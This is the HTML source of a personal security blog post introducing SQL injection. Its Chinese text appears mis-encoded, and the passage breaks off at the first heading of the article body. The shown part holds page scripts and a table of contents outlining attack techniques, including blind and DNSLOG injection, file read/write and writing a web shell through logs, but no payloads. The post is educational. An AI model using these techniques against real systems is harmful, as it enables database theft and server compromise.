<!DOCTYPE html><html lang="[&quot;en&quot;,&quot;zh-CN&quot;,&quot;default&quot;]"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="theme-color" content="#0078E7"><meta name="author" content="Npc"><meta name="copyright" content="Npc"><meta name="generator" content="Hexo 7.1.1"><meta name="theme" content="hexo-theme-yun"><title>ÂàùËØÜsqlÊ≥®ÂÖ• | Npc | Blog</title><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@900&amp;display=swap" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/plugins/line-numbers/prism-line-numbers.css"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/star-markdown-css@0.4.1/dist/yun/yun-markdown.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/my_blog_prism@1.0.5/prism.css"><script src="https://cdn.jsdelivr.net/npm/my_blog_prism@1.0.5/prism.js"></script><script src="https://fastly.jsdelivr.net/npm/scrollreveal/dist/scrollreveal.min.js" defer></script><script>function initScrollReveal() {
  [".post-card",".markdown-body img"].forEach((target)=> {
    ScrollReveal().reveal(target);
  })
}
document.addEventListener("DOMContentLoaded", initScrollReveal);
document.addEventListener("pjax:success", initScrollReveal);
</script><link rel="icon" type="image/svg+xml" href="/yun.svg"><link rel="mask-icon" href="/yun.svg" color="#0078E7"><link rel="preload" href="/css/hexo-theme-yun.css" as="style"><link rel="prefetch" href="/js/sidebar.js" as="script"><link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin><link rel="preconnect" href="https://fastly.jsdelivr.net/npm/" crossorigin><script id="yun-config">
    window.Yun = {}
    window.CONFIG = {"hostname":"npc0vo.github.io","root":"/","title":"NpcÂ∞èÁ´ô","version":"1.10.11","mode":"light","copycode":true,"page":{"isPost":true},"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}.","hits":"${hits} results found","hits_time":"${hits} results found in ${time} ms"},"anonymous_image":"https://cdn.yunyoujun.cn/img/avatar/none.jpg","say":{"api":"https://el-bot-api.vercel.app/api/words/young"},"local_search":{"path":"/search.xml"},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"fireworks":{"colors":null},"waline":{"config":{"enable":true,"serverURL":"https://waline-onelastchicks-projects.vercel.app/","comment":false,"el":"#waline","lang":["en","zh-CN","default"]},"cdn":"https://fastly.jsdelivr.net/npm/@waline/client@v2/dist/waline.js","dark":"html.dark"},"vendors":{"host":"https://fastly.jsdelivr.net/npm/","darken":"https://fastly.jsdelivr.net/npm/darken@1.5.0"}};
  </script><link rel="stylesheet" href="/css/hexo-theme-yun.css"><script src="/js/hexo-theme-yun.js" type="module"></script><script src="//at.alicdn.com/t/font_1140697_dxory92pb0h.js" async></script><link rel="preconnect" href="https://www.google-analytics.com" crossorigin><script async src="https://www.googletagmanager.com/gtag/js?id=G-1LL0D86CY9"></script><script>if (CONFIG.hostname === location.hostname) {
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());
  gtag('config', 'G-1LL0D86CY9');
}</script><script data-ad-client="ca-pub-2245427233262012" async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script><script>(function(){
  var bp = document.createElement('script');
  var curProtocol = window.location.protocol.split(':')[0];
  if (curProtocol === 'https') {
    bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
  }
  else {
    bp.src = 'http://push.zhanzhang.baidu.com/push.js';
  }
  var s = document.getElementsByTagName("script")[0];
  s.parentNode.insertBefore(bp, s);
})();</script><!-- Google Tag Manager --><script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src='https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);})(window,document,'script','dataLayer','GTM-M9KWR9L');</script><!-- End Google Tag Manager --><meta name="description" content="Reference ÁßëÊôÆÂü∫Á°Ä | ÊúÄÂÖ®ÁöÑSQLÊ≥®ÂÖ•ÊÄªÁªì - FreeBufÁΩëÁªúÂÆâÂÖ®Ë°å‰∏öÈó®Êà∑ ÊµÖË∞àSqlÊ≥®ÂÖ•ÊÄªÁªìÁ¨îËÆ∞Êï¥ÁêÜ(Ë∂ÖËØ¶ÁªÜ) - FreeBufÁΩëÁªúÂÆâÂÖ®Ë°å‰∏öÈó®Êà∑ MYSQL Ê≥®ÂÖ•ÊÄªÁªì+ÂéüÁêÜÊ∑±Â∫¶ÂàÜÊûê - ÂÖàÁü•Á§æÂå∫ (aliyun.com)  Ê¶ÇÂøµ  ÂÆö‰πâ SQL Ê≥®ÂÖ•ÊòØÂõ†‰∏∫ÂâçÁ´ØËæìÂÖ•ÊéßÂà∂‰∏ç‰∏•Ê†ºÈÄ†ÊàêÁöÑÊºèÊ¥ûÔºå‰ΩøÂæóÊîªÂáªËÄÖÂèØ‰ª•ËæìÂÖ•ÂØπÂêéÁ´ØÊï∞ÊçÆÂ∫ìÊúâÂç±ÂÆ≥ÁöÑÂ≠óÁ¨¶‰∏≤ÊàñÁ¨¶Âè∑Ôºå‰ΩøÂæóÂêéÁ´ØÊï∞ÊçÆÂ∫ì‰∫ßÁîüÂõûÊòæÊàñÊâßË°åÂëΩ‰ª§Ôºå‰ªéËÄåÂÆû">
<meta property="og:type" content="article">
<meta property="og:title" content="ÂàùËØÜsqlÊ≥®ÂÖ•">
<meta property="og:url" content="http://npc0vo.github.io/2024/07/04/%E5%88%9D%E8%AF%86sql%E6%B3%A8%E5%85%A5/index.html">
<meta property="og:site_name" content="Npc | Blog">
<meta property="og:description" content="Reference ÁßëÊôÆÂü∫Á°Ä | ÊúÄÂÖ®ÁöÑSQLÊ≥®ÂÖ•ÊÄªÁªì - FreeBufÁΩëÁªúÂÆâÂÖ®Ë°å‰∏öÈó®Êà∑ ÊµÖË∞àSqlÊ≥®ÂÖ•ÊÄªÁªìÁ¨îËÆ∞Êï¥ÁêÜ(Ë∂ÖËØ¶ÁªÜ) - FreeBufÁΩëÁªúÂÆâÂÖ®Ë°å‰∏öÈó®Êà∑ MYSQL Ê≥®ÂÖ•ÊÄªÁªì+ÂéüÁêÜÊ∑±Â∫¶ÂàÜÊûê - ÂÖàÁü•Á§æÂå∫ (aliyun.com)  Ê¶ÇÂøµ  ÂÆö‰πâ SQL Ê≥®ÂÖ•ÊòØÂõ†‰∏∫ÂâçÁ´ØËæìÂÖ•ÊéßÂà∂‰∏ç‰∏•Ê†ºÈÄ†ÊàêÁöÑÊºèÊ¥ûÔºå‰ΩøÂæóÊîªÂáªËÄÖÂèØ‰ª•ËæìÂÖ•ÂØπÂêéÁ´ØÊï∞ÊçÆÂ∫ìÊúâÂç±ÂÆ≥ÁöÑÂ≠óÁ¨¶‰∏≤ÊàñÁ¨¶Âè∑Ôºå‰ΩøÂæóÂêéÁ´ØÊï∞ÊçÆÂ∫ì‰∫ßÁîüÂõûÊòæÊàñÊâßË°åÂëΩ‰ª§Ôºå‰ªéËÄåÂÆû">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="http://npc0vo.github.io/2024/07/04/%E5%88%9D%E8%AF%86sql%E6%B3%A8%E5%85%A5/image-20240703220052152.png">
<meta property="og:image" content="http://npc0vo.github.io/2024/07/04/%E5%88%9D%E8%AF%86sql%E6%B3%A8%E5%85%A5/image-20240703220059925.png">
<meta property="og:image" content="http://npc0vo.github.io/2024/07/04/%E5%88%9D%E8%AF%86sql%E6%B3%A8%E5%85%A5/image-20240703221257733.png">
<meta property="og:image" content="http://npc0vo.github.io/2024/07/04/%E5%88%9D%E8%AF%86sql%E6%B3%A8%E5%85%A5/image-20240703221417936.png">
<meta property="og:image" content="http://npc0vo.github.io/2024/07/04/%E5%88%9D%E8%AF%86sql%E6%B3%A8%E5%85%A5/image-20240703222000657.png">
<meta property="og:image" content="http://npc0vo.github.io/2024/07/04/%E5%88%9D%E8%AF%86sql%E6%B3%A8%E5%85%A5/image-20240703222526003.png">
<meta property="og:image" content="http://npc0vo.github.io/2024/07/04/%E5%88%9D%E8%AF%86sql%E6%B3%A8%E5%85%A5/image-20240703222607243.png">
<meta property="og:image" content="http://npc0vo.github.io/2024/07/04/%E5%88%9D%E8%AF%86sql%E6%B3%A8%E5%85%A5/1674381-20190707141421874-1913088861.jpg">
<meta property="article:published_time" content="2024-07-04T14:40:13.000Z">
<meta property="article:modified_time" content="2024-07-09T03:55:58.152Z">
<meta property="article:author" content="Npc">
<meta property="article:tag" content="Web">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://npc0vo.github.io/2024/07/04/%E5%88%9D%E8%AF%86sql%E6%B3%A8%E5%85%A5/image-20240703220052152.png"><script>(function() {
  if (CONFIG.mode !== 'auto') return
  const prefersDark = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches
  const setting = localStorage.getItem('darken-mode') || 'auto'
  if (setting === 'dark' || (prefersDark && setting !== 'light'))
    document.documentElement.classList.toggle('dark', true)
})()</script></head><body><script src="https://code.iconify.design/2/2.1.1/iconify.min.js"></script><script>// Define global variable
IconifyProviders = {
  // Empty prefix: overwrite default API provider configuration
  '': {
    // Use custom API first, use Iconify public API as backup
    resources: [
        'https://api.iconify.design',
    ],
    // Wait for 1 second before switching API hosts
    rotate: 1000,
  },
};</script><script defer src="https://fastly.jsdelivr.net/npm/animejs@latest"></script><script defer src="/js/ui/fireworks.js" type="module"></script><canvas class="fireworks"></canvas><div class="container"><a class="sidebar-toggle hty-icon-button" id="menu-btn"><div class="hamburger hamburger--spin" type="button"><span class="hamburger-box"><span class="hamburger-inner"></span></span></div></a><div class="sidebar-toggle sidebar-overlay"></div><aside class="sidebar"><script src="/js/sidebar.js" type="module"></script><ul class="sidebar-nav"><li class="sidebar-nav-item sidebar-nav-toc hty-icon-button sidebar-nav-active" data-target="post-toc-wrap" title="Table of Contents"><span class="icon iconify" data-icon="ri:list-ordered"></span></li><li class="sidebar-nav-item sidebar-nav-overview hty-icon-button" data-target="site-overview-wrap" title="Overview"><span class="icon iconify" data-icon="ri:passport-line"></span></li></ul><div class="sidebar-panel" id="site-overview-wrap"><div class="site-info fix-top"><a class="site-author-avatar" href="/about/" title="Npc"><img width="96" loading="lazy" src="/images/avatar.jpg" alt="Npc"><span class="site-author-status">üò≠</span></a><div class="site-author-name"><a href="/about/">Npc</a></div><span class="site-name">Npc | Blog</span><sub class="site-subtitle">ÂèàÊ¥ª‰∫Ü‰∏ÄÂ§©</sub><div class="site-description"></div></div><nav class="site-state"><a class="site-state-item hty-icon-button icon-home" href="/" title="Home"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:home-4-line"></span></span></a><div class="site-state-item"><a href="/archives/" title="Archives"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:archive-line"></span></span><span class="site-state-item-count">79</span></a></div><div class="site-state-item"><a href="/categories/" title="Categories"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:folder-2-line"></span></span><span class="site-state-item-count">13</span></a></div><div class="site-state-item"><a href="/tags/" title="Tags"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="site-state-item-count">17</span></a></div><a class="site-state-item hty-icon-button" href="/about/#comment" title="ÁïôË®ÄÊùø"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:clipboard-line"></span></span></a></nav><hr style="margin-bottom:0.5rem"><div class="links-of-author"><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://github.com/npc0vo" title="GitHub" target="_blank" style="color:#6e5494"><span class="icon iconify" data-icon="ri:github-line"></span></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="mailto:me@1930278836@qq.com" title="E-Mail" target="_blank" style="color:#8E71C1"><span class="icon iconify" data-icon="ri:mail-line"></span></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://www.yuque.com/npc0vo" title="Yuque" target="_blank" style="color:#a0c69d"><span class="icon iconify" data-icon="ri:yuque-line"></span></a></div><hr style="margin:0.5rem 1rem"><div class="links"><a class="links-item hty-icon-button" href="/links/" title="ÊàëÁöÑÂ∞è‰ºô‰º¥‰ª¨" style="color:dodgerblue"><span class="icon iconify" data-icon="ri:genderless-line"></span></a></div></div><div class="sidebar-panel sidebar-panel-active" id="post-toc-wrap"><div class="post-toc"><div class="post-toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#reference"><span class="toc-number">1.</span> <span class="toc-text"> Reference</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A6%82%E5%BF%B5"><span class="toc-number">2.</span> <span class="toc-text"> Ê¶ÇÂøµ</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9A%E4%B9%89"><span class="toc-number">2.1.</span> <span class="toc-text"> ÂÆö‰πâ</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E4%BD%8D%E7%BD%AE"><span class="toc-number">2.2.</span> <span class="toc-text"> Â∏∏ËßÅ‰ΩçÁΩÆ</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E7%B1%BB"><span class="toc-number">2.3.</span> <span class="toc-text"> ÂàÜÁ±ª</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mysql%E4%B8%8Emssql%E5%8F%8Aaccess%E5%8C%BA%E5%88%AB"><span class="toc-number">2.4.</span> <span class="toc-text"> MySQL‰∏éMSSQLÂèäACCESSÂå∫Âà´</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8"><span class="toc-number">3.</span> <span class="toc-text"> Âà©Áî®</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E4%B8%8D%E5%90%8C%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E8%AF%AD%E5%8F%A5"><span class="toc-number">3.1.</span> <span class="toc-text"> Âà§Êñ≠‰∏çÂêåÊï∞ÊçÆÂ∫ìÁöÑËØ≠Âè•</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8sql%E6%B3%A8%E5%85%A5"><span class="toc-number">3.2.</span> <span class="toc-text"> Âà§Êñ≠ÊòØÂê¶Â≠òÂú®sqlÊ≥®ÂÖ•</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E9%97%AD%E5%90%88%E6%96%B9%E5%BC%8F"><span class="toc-number">3.3.</span> <span class="toc-text"> Âà§Êñ≠Èó≠ÂêàÊñπÂºè</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5"><span class="toc-number">3.4.</span> <span class="toc-text"> ËÅîÂêàÊ≥®ÂÖ•</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#step1%E7%B1%BB%E5%9E%8B%E5%88%A4%E6%96%AD"><span class="toc-number">3.4.1.</span> <span class="toc-text"> step1Á±ªÂûãÂà§Êñ≠</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#step2%E6%9F%A5%E5%AD%97%E6%AE%B5%E4%B8%AA%E6%95%B0"><span class="toc-number">3.4.2.</span> <span class="toc-text"> step2Êü•Â≠óÊÆµ‰∏™Êï∞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#step3%E6%9F%A5%E6%89%BE%E6%98%BE%E7%A4%BA%E4%BD%8D"><span class="toc-number">3.4.3.</span> <span class="toc-text"> step3Êü•ÊâæÊòæÁ§∫‰Ωç</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#step4%E7%88%86%E5%BA%93%E5%90%8D"><span class="toc-number">3.4.4.</span> <span class="toc-text"> step4ÁàÜÂ∫ìÂêç</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#step5%E7%88%86%E8%A1%A8%E5%90%8D"><span class="toc-number">3.4.5.</span> <span class="toc-text"> step5ÁàÜË°®Âêç</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#step6%E7%88%86%E5%88%97%E5%90%8D"><span class="toc-number">3.4.6.</span> <span class="toc-text"> step6ÁàÜÂàóÂêç</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#step7%E7%88%86%E4%BF%A1%E6%81%AF"><span class="toc-number">3.4.7.</span> <span class="toc-text"> step7ÁàÜ‰ø°ÊÅØ</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">3.5.</span> <span class="toc-text"> Êä•ÈîôÊ≥®ÂÖ•</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#xpath%E5%AF%BC%E8%87%B4%E7%9A%84%E6%8A%A5%E9%94%99"><span class="toc-number">3.5.1.</span> <span class="toc-text"> xpathÂØºËá¥ÁöÑÊä•Èîô</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#updatexml"><span class="toc-number">3.5.1.1.</span> <span class="toc-text"> updatexml()</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#extractvalue-%E5%87%BD%E6%95%B0"><span class="toc-number">3.5.1.2.</span> <span class="toc-text"> extractvalue() ÂáΩÊï∞</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%BB%E9%94%AE%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">3.5.2.</span> <span class="toc-text"> ‰∏ªÈîÆÊä•ÈîôÊ≥®ÂÖ•</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AE%9E%E6%88%98%E6%B5%81%E7%A8%8B"><span class="toc-number">3.5.2.1.</span> <span class="toc-text"> ÂÆûÊàòÊµÅÁ®ã</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E6%BA%A2%E5%87%BA%E6%8A%A5%E9%94%99"><span class="toc-number">3.5.3.</span> <span class="toc-text"> Êï∞ÊçÆÊ∫¢Âá∫Êä•Èîô</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#exp%E5%87%BD%E6%95%B0"><span class="toc-number">3.5.4.</span> <span class="toc-text"> exp()ÂáΩÊï∞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pow%E5%87%BD%E6%95%B0"><span class="toc-number">3.5.5.</span> <span class="toc-text"> pow()ÂáΩÊï∞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A9%BA%E9%97%B4%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%E6%8A%A5%E9%94%99"><span class="toc-number">3.5.6.</span> <span class="toc-text"> Á©∫Èó¥Êï∞ÊçÆÁ±ªÂûãÊä•Èîô</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="toc-number">3.6.</span> <span class="toc-text"> Â∏ÉÂ∞îÁõ≤Ê≥®</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0"><span class="toc-number">3.6.1.</span> <span class="toc-text"> Â∏∏Áî®ÂáΩÊï∞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">3.6.2.</span> <span class="toc-text"> ÂéüÁêÜ</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="toc-number">3.7.</span> <span class="toc-text"> Êó∂Èó¥Áõ≤Ê≥®</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0-2"><span class="toc-number">3.7.1.</span> <span class="toc-text"> Â∏∏Áî®ÂáΩÊï∞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-2"><span class="toc-number">3.7.2.</span> <span class="toc-text"> ÂéüÁêÜ</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#dnslog%E6%B3%A8%E5%85%A5"><span class="toc-number">3.8.</span> <span class="toc-text"> DNSLOGÊ≥®ÂÖ•</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#unc%E8%B7%AF%E5%BE%84"><span class="toc-number">3.8.1.</span> <span class="toc-text"> UNCË∑ØÂæÑ</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#load_file-%E5%87%BD%E6%95%B0"><span class="toc-number">3.8.2.</span> <span class="toc-text"> load_file() ÂáΩÊï∞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#dnslog-%E7%9B%B2%E6%B3%A8%E5%8E%9F%E7%90%86"><span class="toc-number">3.8.3.</span> <span class="toc-text"> DNSLOG Áõ≤Ê≥®ÂéüÁêÜ</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5"><span class="toc-number">3.9.</span> <span class="toc-text"> Â†ÜÂè†Ê≥®ÂÖ•</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5"><span class="toc-number">3.10.</span> <span class="toc-text"> ÂÆΩÂ≠óËäÇÊ≥®ÂÖ•</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E5%AE%BD%E5%AD%97%E8%8A%82"><span class="toc-number">3.10.1.</span> <span class="toc-text"> ‰ªÄ‰πàÊòØÂÆΩÂ≠óËäÇ</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%95%8F%E6%84%9F%E5%87%BD%E6%95%B0"><span class="toc-number">3.10.2.</span> <span class="toc-text"> ÊïèÊÑüÂáΩÊï∞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-3"><span class="toc-number">3.10.3.</span> <span class="toc-text"> ÂéüÁêÜ</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5"><span class="toc-number">3.11.</span> <span class="toc-text"> ‰∫åÊ¨°Ê≥®ÂÖ•</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-4"><span class="toc-number">3.11.1.</span> <span class="toc-text"> ÂéüÁêÜ</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#cookie%E6%B3%A8%E5%85%A5"><span class="toc-number">3.12.</span> <span class="toc-text"> cookieÊ≥®ÂÖ•</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#base64%E6%B3%A8%E5%85%A5"><span class="toc-number">3.13.</span> <span class="toc-text"> base64Ê≥®ÂÖ•</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#user-agentreferer%E6%B3%A8%E5%85%A5"><span class="toc-number">3.14.</span> <span class="toc-text"> user-agent,refererÊ≥®ÂÖ•</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sql%E6%B3%A8%E5%85%A5%E8%AF%BB%E5%86%99%E6%96%87%E4%BB%B6"><span class="toc-number">3.15.</span> <span class="toc-text"> sqlÊ≥®ÂÖ•ËØªÂÜôÊñá‰ª∂</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#sql%E6%B3%A8%E5%85%A5%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99%E6%96%B9%E5%BC%8F"><span class="toc-number">3.15.1.</span> <span class="toc-text"> sqlÊ≥®ÂÖ•Êñá‰ª∂ËØªÂÜôÊñπÂºè</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8Bsecure_file_priv%E8%AE%BE%E7%BD%AE%E7%8A%B6%E6%80%81"><span class="toc-number">3.15.2.</span> <span class="toc-text"> Êü•Áúãsecure_file_privËÆæÁΩÆÁä∂ÊÄÅ</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%AB%98%E6%9D%83%E9%99%90%E6%B3%A8%E5%85%A5%E9%81%87%E5%88%B0secure_file_priv"><span class="toc-number">3.15.3.</span> <span class="toc-text"> È´òÊùÉÈôêÊ≥®ÂÖ•ÈÅáÂà∞secure_file_priv</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#sql%E6%B3%A8%E5%85%A5%E5%88%A9%E7%94%A8%E6%97%A5%E5%BF%97%E5%86%99shell"><span class="toc-number">3.15.4.</span> <span class="toc-text"> SQLÊ≥®ÂÖ•Âà©Áî®Êó•ÂøóÂÜôshellÔºö</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sqlmap%E5%B8%B8%E8%A7%81%E4%BD%BF%E7%94%A8"><span class="toc-number">3.16.</span> <span class="toc-text"> sqlmapÂ∏∏ËßÅ‰ΩøÁî®</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF"><span class="toc-number">4.</span> <span class="toc-text"> ÁªïËøáÂßøÂäø</span></a></li></ol></div></div></div></aside><main class="sidebar-translate" id="content"><div id="post"><article class="hty-card post-block" itemscope itemtype="https://schema.org/Article" style="--smc-primary:#0078E7;"><link itemprop="mainEntityOfPage" href="http://npc0vo.github.io/2024/07/04/%E5%88%9D%E8%AF%86sql%E6%B3%A8%E5%85%A5/"><span hidden itemprop="author" itemscope itemtype="https://schema.org/Person"><meta itemprop="name" content="Npc"><meta itemprop="description"></span><span hidden itemprop="publisher" itemscope itemtype="https://schema.org/Organization"><meta itemprop="name" content="Npc | Blog"></span><header class="post-header"><h1 class="post-title" itemprop="name headline">ÂàùËØÜsqlÊ≥®ÂÖ•</h1><div class="post-meta"><div class="post-time" style="display:block"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:calendar-line"></span></span> <time title="Created: 2024-07-04 22:40:13" itemprop="dateCreated datePublished" datetime="2024-07-04T22:40:13+08:00">2024-07-04</time><span class="post-meta-divider">-</span><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:calendar-2-line"></span></span> <time title="Modified: 2024-07-09 11:55:58" itemprop="dateModified" datetime="2024-07-09T11:55:58+08:00">2024-07-09</time></div><span class="post-count"><span class="post-symbolcount"><span class="post-meta-item-icon" title="Word count in article"><span class="icon iconify" data-icon="ri:file-word-line"></span></span> <span title="Word count in article">8.5k</span><span class="post-meta-divider">-</span><span class="post-meta-item-icon" title="Reading time"><span class="icon iconify" data-icon="ri:timer-line"></span></span> <span title="Reading time">33m</span></span></span><div class="post-classify"><span class="post-category"> <span class="post-meta-item-icon" style="margin-right:3px;"><span class="icon iconify" data-icon="ri:folder-line"></span></span><span itemprop="about" itemscope itemtype="https://schema.org/Thing"><a class="category-item" href="/categories/Web/" style="--text-color:var(--hty-text-color)" itemprop="url" rel="index"><span itemprop="text">Web</span></a></span></span><span class="post-tag"><span class="post-meta-divider">-</span><a class="tag-item" href="/tags/Web/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="tag-name">Web</span></a></span></div></div></header><section class="post-body" itemprop="articleBody"><div class="post-content markdown-body"><h2 id="reference"><a class="markdownIt-Anchor" href="#reference"></a> Reference</h2>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/356765.html">ÁßëÊôÆÂü∫Á°Ä | ÊúÄÂÖ®ÁöÑSQLÊ≥®ÂÖ•ÊÄªÁªì - FreeBufÁΩëÁªúÂÆâÂÖ®Ë°å‰∏öÈó®Êà∑</a></p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/339118.html">ÊµÖË∞àSqlÊ≥®ÂÖ•ÊÄªÁªìÁ¨îËÆ∞Êï¥ÁêÜ(Ë∂ÖËØ¶ÁªÜ) - FreeBufÁΩëÁªúÂÆâÂÖ®Ë°å‰∏öÈó®Êà∑</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/13604?time__1311=mqmxnQ0QiQeDwq0vCxUggFiZAFPD&amp;alichlgref=https%3A%2F%2Fwww.bing.com%2F">MYSQL Ê≥®ÂÖ•ÊÄªÁªì+ÂéüÁêÜÊ∑±Â∫¶ÂàÜÊûê - ÂÖàÁü•Á§æÂå∫ (aliyun.com)</a></p>
<h2 id="Ê¶ÇÂøµ"><a class="markdownIt-Anchor" href="#Ê¶ÇÂøµ"></a> Ê¶ÇÂøµ</h2>
<h3 id="ÂÆö‰πâ"><a class="markdownIt-Anchor" href="#ÂÆö‰πâ"></a> ÂÆö‰πâ</h3>
